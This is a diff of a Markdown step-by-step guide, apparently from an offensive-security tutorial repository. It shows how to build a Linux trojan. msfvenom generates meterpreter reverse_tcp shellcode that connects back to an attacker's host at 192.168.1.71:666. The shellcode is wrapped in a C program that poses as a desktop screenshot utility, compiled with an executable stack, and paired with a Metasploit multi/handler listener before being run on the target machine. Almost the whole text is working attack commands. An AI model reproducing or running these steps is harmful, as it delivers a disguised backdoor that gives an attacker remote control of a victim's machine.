@@ -37,20 +37,43 @@ but also contains a system command that takes a screenshot to the desktop of the
 
 <br /><br /><br />
 
+### STEP-BY-STEP (HOW-TO)
+
+<br />
+
+#### Build shellcode folder
+
+```
+sudo mkdir shellcode
+cd shellcode
+```
+
+<br /><br />
+
 #### Use Metasploit to Build Shellcode in C Format
 
 ```
-   ## build shellcode folder
-   sudo mkdir shellcode
-   cd shellcode
-
-
    ## Build raw shellcode in C
-   # WARNING: Replace LHOST value by your ip address
-   # WARNING: If your attacking a x86 bit system, then change the arch from x64 to x86
-   #
-   sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=666 -a x64 --platform linux -f c -o chars.raw
+   # WARNING: Replace LHOST value by your local ip address
+   # WARNING: If your attacking a x64 bit system, then change the arch from -a x86 to -a x64
+   sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 -a x86 --platform linux -f c -o chars.raw
 
+```
+
+<br /><br />
+
+#### See whats written inside chars.raw (optional)
+
+```
+   cat chars.raw
+```
+
+<br /><br />
+
+#### Parse shellcode data and store it into a local bash variable
+
+```
+   pa=$(cat chars.raw | grep -v "=" | tr -d '"; ' | tr -d '\n')
 ```
 
 <br /><br />
@@ -58,10 +81,6 @@ but also contains a system command that takes a screenshot to the desktop of the
 #### Insert the C shellcode created into a C program
 
 ```
-   ## Parse shellcode data and store it into a local bash variable
-   pa=$(cat chars.raw | grep -v "=" | tr -d '";' | tr -d '\n' | tr -d ' ')
-
-   ## Build payload.c
    echo "#include<stdio.h>" > payload.c
    echo "#include<stdlib.h>" >> payload.c
    echo "#include<string.h>" >> payload.c
@@ -71,14 +90,21 @@ but also contains a system command that takes a screenshot to the desktop of the
    echo "int main()" >> payload.c
    echo "{" >> payload.c
    echo "  printf(\"[i] Please Wait, Taking Screenshot ..\");" >> payload.c
+   echo "  system(\"sleep 1; xwd -root -out /tmp/ScreenShot.xwd\");" >> payload.c
    echo "  printf(\"[i] Screenshot Stored Under: /tmp/ScreenShot.xwd\");" >> payload.c
-   echo "  system(\"xwd -root -out /tmp/ScreenShot.xwd\");" >> payload.c
-   echo "  system(\"xuwd -in /tmp/ScreenShot.xwd\");" >> payload.c
+   echo "  system(\"sleep 1; xwud /tmp/ScreenShot.xwd\");" >> payload.c
    echo "  void (*ret)() = (void(*)())buf;" >> payload.c
    echo "  ret();" >> payload.c
    echo "}" >> payload.c
 ```
 
+<br /><br />
+
+#### See whats written inside payload.c (optional)
+
+```
+   cat payload.c
+```
 
 <br /><br />
 
@@ -86,6 +112,25 @@ but also contains a system command that takes a screenshot to the desktop of the
 
 ```
  sudo gcc -fno-stack-protector -z execstack payload.c -o desktop_screenshot
+```
+
+<br /><br />
+
+#### Start metasploit multi handler
+
+```
+   # WARNING: Replace LHOST value by your local ip address
+   # WARNING: If your attacking a x64 bit system, then change the arch from -a x86 to -a x64
+   sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit'
+```
+
+<br /><br />
+
+#### Execute C Program (remote machine)
+
+```
+chmod +x desktop_screenshot
+sudo ./desktop_screenshot
 ```
 
 <br /><br />
